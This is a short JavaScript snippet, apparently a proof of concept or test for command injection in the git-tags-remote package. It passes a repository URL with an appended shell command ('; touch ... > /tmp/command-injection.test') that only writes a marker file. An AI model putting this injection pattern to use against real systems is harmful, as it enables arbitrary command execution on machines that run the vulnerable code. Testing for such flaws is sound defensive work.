const gitTagsRemote = require("git-tags-remote");
try {
  gitTagsRemote.get(
    "https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test"
  );
} catch (err) {}
